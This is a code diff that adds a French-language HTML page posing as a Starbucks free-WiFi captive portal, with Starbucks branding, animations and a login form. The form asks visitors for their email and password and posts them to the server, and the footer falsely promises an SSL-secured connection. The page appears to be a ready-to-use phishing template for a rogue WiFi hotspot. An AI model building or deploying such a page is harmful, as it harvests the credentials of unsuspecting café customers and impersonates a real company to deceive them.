@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Starbucks WiFi Gratuit</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #00704A 0%, #FFFFFF 50%, #00A862 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding: 2rem 0;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 25% 25%, rgba(0, 112, 74, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(255, 255, 255, 0.3) 0%, transparent 50%);
+            animation: backgroundMove 22s ease-in-out infinite;
+        }
+
+        @keyframes backgroundMove {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-15px, -15px) scale(1.05); }
+        }
+
+        .container {
+            background: linear-gradient(145deg, #ffffff 0%, #f8f9fa 100%);
+            border-radius: 25px;
+            padding: 2.5rem;
+            box-shadow: 0 25px 70px rgba(0, 112, 74, 0.3);
+            width: 100%;
+            max-width: 430px;
+            position: relative;
+            animation: slideIn 0.9s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(100px) scale(0.8);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .logo {
+            width: 130px;
+            height: 130px;
+            background: linear-gradient(135deg, #00704A, #00A862);
+            border-radius: 50%;
+            margin: 0 auto 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            box-shadow: 0 15px 40px rgba(0, 112, 74, 0.4);
+            animation: logoFloat 3s ease-in-out infinite;
+            border: 4px solid #FFFFFF;
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-12px) rotate(5deg); }
+        }
+
+        .logo::before {
+            content: '☕';
+            font-size: 4rem;
+            color: #FFFFFF;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            width: 35px;
+            height: 35px;
+            background: #FFFFFF;
+            border-radius: 50%;
+            border: 3px solid #00704A;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .brand-name {
+            color: #00704A;
+            font-size: 2.5rem;
+            font-weight: 900;
+            margin-bottom: 0.5rem;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+            letter-spacing: -1px;
+        }
+
+        .brand-subtitle {
+            color: #666;
+            font-size: 1.1rem;
+            font-weight: 500;
+            margin-bottom: 0.5rem;
+            font-style: italic;
+        }
+
+        .wifi-title {
+            color: #555;
+            font-size: 1.3rem;
+            font-weight: 300;
+            margin-bottom: 0.8rem;
+        }
+
+        .wifi-info {
+            background: linear-gradient(90deg, #00704A, #00A862);
+            color: #FFFFFF;
+            padding: 1rem 1.8rem;
+            border-radius: 30px;
+            font-size: 1rem;
+            font-weight: 700;
+            display: inline-block;
+            animation: glow 2.5s ease-in-out infinite alternate;
+            border: 3px solid #FFFFFF;
+            box-shadow: 0 8px 20px rgba(0, 112, 74, 0.3);
+        }
+
+        @keyframes glow {
+            from { 
+                box-shadow: 0 8px 20px rgba(0, 112, 74, 0.3);
+                transform: scale(1);
+            }
+            to { 
+                box-shadow: 0 12px 30px rgba(0, 168, 98, 0.4);
+                transform: scale(1.05);
+            }
+        }
+
+        .welcome-text {
+            text-align: center;
+            color: #333;
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+            background: linear-gradient(135deg, #f9fafb, #ffffff);
+            padding: 1.5rem;
+            border-radius: 15px;
+            border-left: 4px solid #00704A;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 0.8rem;
+            font-size: 1rem;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 1.3rem 1.6rem;
+            border: 2px solid #E5E5E5;
+            border-radius: 20px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background: #FAFAFA;
+            outline: none;
+            font-weight: 500;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #00704A;
+            background: white;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(0, 112, 74, 0.3);
+        }
+
+        .connect-btn {
+            width: 100%;
+            padding: 1.4rem;
+            background: linear-gradient(135deg, #00704A 0%, #00A862 100%);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 1.5rem;
+        }
+
+        .connect-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: left 0.6s;
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 20px 40px rgba(0, 112, 74, 0.4);
+            background: linear-gradient(135deg, #005a3a 0%, #008a52 100%);
+        }
+
+        .connect-btn:hover::before {
+            left: 100%;
+        }
+
+        .connect-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .footer-info {
+            text-align: center;
+            color: #888;
+            font-size: 0.85rem;
+            line-height: 1.5;
+            margin-top: 1rem;
+            background: rgba(248, 250, 251, 0.8);
+            padding: 1rem;
+            border-radius: 12px;
+        }
+
+        .terms-link {
+            color: #00704A;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .terms-link:hover {
+            text-decoration: underline;
+            color: #00A862;
+        }
+
+        .wifi-status {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 251, 0.95));
+            padding: 0.6rem 1.2rem;
+            border-radius: 25px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #00704A;
+            border: 2px solid rgba(0, 112, 74, 0.2);
+        }
+
+        .signal-bars {
+            display: flex;
+            gap: 2px;
+        }
+
+        .bar {
+            width: 4px;
+            border-radius: 2px;
+            animation: signalStrength 1.8s ease-in-out infinite;
+        }
+
+        .bar:nth-child(1) { height: 8px; background: #00704A; animation-delay: 0s; }
+        .bar:nth-child(2) { height: 12px; background: #00704A; animation-delay: 0.2s; }
+        .bar:nth-child(3) { height: 16px; background: #00A862; animation-delay: 0.4s; }
+        .bar:nth-child(4) { height: 20px; background: #00A862; animation-delay: 0.6s; }
+
+        @keyframes signalStrength {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+
+        .particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            animation: floatParticles 25s linear infinite;
+        }
+
+        .particle:nth-child(odd) { 
+            background: #00704A; 
+            box-shadow: 0 0 10px rgba(0, 112, 74, 0.5);
+        }
+        .particle:nth-child(even) { 
+            background: #FFFFFF; 
+            border: 2px solid #00704A;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
+        }
+
+        @keyframes floatParticles {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        .loading {
+            display: inline-block;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .promo-banner {
+            background: linear-gradient(90deg, #00704A, #00A862, #00704A);
+            color: white;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            border-radius: 15px;
+            text-align: center;
+            font-weight: 600;
+            font-size: 0.95rem;
+            animation: pulse 2.5s ease-in-out infinite;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin: 1rem;
+                padding: 2rem;
+            }
+            
+            .logo {
+                width: 110px;
+                height: 110px;
+            }
+            
+            .logo::before {
+                font-size: 3.5rem;
+            }
+            
+            .brand-name {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles">
+        <div class="particle" style="left: 10%; animation-delay: 0s;"></div>
+        <div class="particle" style="left: 20%; animation-delay: 3s;"></div>
+        <div class="particle" style="left: 30%; animation-delay: 6s;"></div>
+        <div class="particle" style="left: 40%; animation-delay: 9s;"></div>
+        <div class="particle" style="left: 50%; animation-delay: 12s;"></div>
+        <div class="particle" style="left: 60%; animation-delay: 15s;"></div>
+        <div class="particle" style="left: 70%; animation-delay: 18s;"></div>
+        <div class="particle" style="left: 80%; animation-delay: 21s;"></div>
+        <div class="particle" style="left: 90%; animation-delay: 24s;"></div>
+    </div>
+
+    <div class="container">
+        <div class="wifi-status">
+            <div class="signal-bars">
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+            </div>
+            WiFi Store
+        </div>
+
+        <div class="header">
+            <div class="logo"></div>
+            <h1 class="brand-name">Starbucks</h1>
+            <p class="brand-subtitle">Third Place Experience</p>
+            <p class="wifi-title">WiFi Gratuit</p>
+            <div class="wifi-info">Connexion Premium</div>
+        </div>
+
+        <div class="promo-banner">
+            ☕ Savourez votre moment Starbucks !
+        </div>
+
+        <div class="welcome-text">
+            <strong>Bienvenue chez Starbucks !</strong><br>
+            Connectez-vous à notre WiFi gratuit et profitez de votre pause café dans un environnement connecté.
+        </div>
+
+        <form id="wifiForm" action="/" method="post">
+            <div class="form-group">
+                <label for="email">Adresse e-mail</label>
+                <input type="email" id="email" name="email" required placeholder="votre@email.com">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" required placeholder="Votre mot de passe">
+            </div>
+
+            <button type="submit" class="connect-btn" id="connectBtn">
+                🌐 Se connecter
+            </button>
+        </form>
+
+        <div class="footer-info">
+            En vous connectant, vous acceptez nos <a href="#" class="terms-link">conditions d'utilisation</a>.<br>
+            <strong>Starbucks Coffee</strong> • Connexion sécurisée SSL<br>
+            Bon moment chez nous !
+        </div>
+    </div>
+
+    <script>
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentElement.style.transform = 'scale(1.02)';
+                this.parentElement.style.transition = 'transform 0.3s ease';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.parentElement.style.transform = 'scale(1)';
+            });
+        });
+
+        document.getElementById('wifiForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('connectBtn');
+            btn.innerHTML = '<div class="loading"></div> Connexion en cours...';
+            btn.disabled = true;
+            btn.style.background = 'linear-gradient(135deg, #005a3a, #008a52)';
+        });
+
+        function createParticle() {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 25 + 's';
+            particle.style.animationDuration = (Math.random() * 15 + 15) + 's';
+            
+            if (Math.random() > 0.5) {
+                particle.style.background = '#00704A';
+                particle.style.boxShadow = '0 0 10px rgba(0, 112, 74, 0.5)';
+            } else {
+                particle.style.background = '#FFFFFF';
+                particle.style.border = '2px solid #00704A';
+                particle.style.boxShadow = '0 0 10px rgba(255, 255, 255, 0.8)';
+            }
+            
+            document.querySelector('.particles').appendChild(particle);
+            
+            setTimeout(() => {
+                particle.remove();
+            }, 40000);
+        }
+
+        setInterval(createParticle, 2000);
+
+        setTimeout(() => {
+            document.querySelector('.container').style.animation = 'pulse 0.6s ease-in-out';
+        }, 1200);
+    </script>
+</body>
+</html>
